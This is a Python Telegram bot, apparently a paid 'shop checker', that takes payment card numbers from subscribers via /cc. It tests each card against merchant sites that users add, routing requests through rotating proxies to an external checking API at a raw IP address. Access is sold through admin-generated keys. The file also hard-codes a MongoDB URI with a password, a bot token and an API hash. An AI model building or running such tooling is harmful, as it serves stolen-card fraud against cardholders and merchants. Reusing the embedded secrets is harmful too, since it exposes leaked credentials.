from telethon import TelegramClient, events
from motor.motor_asyncio import AsyncIOMotorClient
from datetime import datetime, timedelta
import random, string, asyncio, threading, aiohttp, os
from http.server import HTTPServer, BaseHTTPRequestHandler

# --- RENDER HEALTH CHECK ---
def run_health_check():
    class H(BaseHTTPRequestHandler):
        def do_GET(self): self.send_response(200); self.end_headers(); self.wfile.write(b"OK")
    HTTPServer(('0.0.0.0', 10000), H).serve_forever()
threading.Thread(target=run_health_check, daemon=True).start()

# --- CONFIG ---
MONGO_URI = "mongodb+srv://riot_adminn:A2723Dscyq3gYhFi@cluster0.agit2bo.mongodb.net/?appName=Cluster0"
ADMIN_ID = 5541778617
BOT_TOKEN = '8284884126:AAFYSgVRWYh9ClQ-p6okChEyGyLnQo_OQaE'
API_ID = 38807471
API_HASH = '9bbfb9efe1a47596cf7f1b20017f5dc6'

client = AsyncIOMotorClient(MONGO_URI)
db = client.shop_checker_db
bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# --- HELPERS ---
async def is_premium(user_id):
    if user_id == ADMIN_ID: return True
    user = await db.users.find_one({"user_id": str(user_id)})
    if user:
        return datetime.strptime(user['expiry'], '%Y-%m-%d %H:%M:%S') > datetime.now()
    return False

# --- COMMANDS ---
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    await event.reply("<b>⚡ Welcome to Shopiiiii ! ⚡</b>\nCommands: /cc, /chk, /bin, /redeem, /addproxy, /proxy, /addsite, /site, /genkey\n<b>Made wt ♥️: P.o.Riot 🍄</b>", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/genkey\s+(\d+)'))
async def genkey(event):
    if event.sender_id != ADMIN_ID: return
    days = int(event.pattern_match.group(1))
    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    await db.keys.insert_one({"key": key, "days": days})
    await event.reply(f"🔑 **Key Created:** `{key}` ({days} Days)")

@bot.on(events.NewMessage(pattern=r'^/addproxy'))
async def add_proxy(event):
    if not await is_premium(event.sender_id): return
    raw = event.message.text.split('\n')[1:]
    proxies = [p.strip() for p in raw if p.strip()]
    if not proxies: return await event.reply("❌ Paste proxies on new lines below /addproxy")
    await db.proxies.insert_many([{"proxy": p} for p in proxies])
    await event.reply(f"✅ {len(proxies)} Proxies added to Cloud.")

@bot.on(events.NewMessage(pattern='/proxy'))
async def show_proxy(event):
    if not await is_premium(event.sender_id): return
    count = await db.proxies.count_documents({})
    await event.reply(f"💠 **Total Proxies:** `{count}`")

@bot.on(events.NewMessage(pattern=r'^/addsite'))
async def add_site(event):
    if not await is_premium(event.sender_id): return
    raw = event.message.text.split('\n')[1:]
    sites = [s.strip() for s in raw if s.strip().startswith('http')]
    if not sites: return await event.reply("❌ Paste URLs below /addsite")
    await db.sites.insert_many([{"url": s} for s in sites])
    await event.reply(f"✅ {len(sites)} Sites added to Cloud.")

@bot.on(events.NewMessage(pattern='/site'))
async def show_site(event):
    if not await is_premium(event.sender_id): return
    count = await db.sites.count_documents({})
    await event.reply(f"💠 **Total Sites:** `{count}`")

@bot.on(events.NewMessage(pattern=r'^/cc\s+(.+)'))
async def cc_check(event):
    if not await is_premium(event.sender_id): return
    card = event.pattern_match.group(1).strip()
    
    # Get random site and proxy from DB
    site_doc = await db.sites.aggregate([{"$sample": {"size": 1}}]).to_list(1)
    proxy_doc = await db.proxies.aggregate([{"$sample": {"size": 1}}]).to_list(1)
    
    if not site_doc or not proxy_doc:
        return await event.reply("❌ Add sites and proxies first!")

    target_site = site_doc[0]['url']
    target_proxy = proxy_doc[0]['proxy']
    
    msg = await event.reply(f"⌛ **Checking Card...**\n`{card}`")
    
    try:
        # This uses your new Endpoint structure
        api_url = f"http://148.230.102.178:8081/?{card}"
        params = {'url': target_site, 'proxy': target_proxy}
        
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, params=params, timeout=60) as resp:
                res = await resp.json(content_type=None)
                # Format response based on your API structure
                status = res.get('Status', 'Unknown')
                response = res.get('Response', 'No response')
                await msg.edit(f"💳 **Card:** `{card}`\n🎯 **Status:** {status}\n💬 **Result:** {response}\n🌐 **Site:** {target_site}")
    except Exception as e:
        await msg.edit(f"❌ **API Error:** {str(e)}")

print("✅ Bot fully synchronized with MongoDB - P.o.Riot 🍄")
bot.run_until_disconnected()
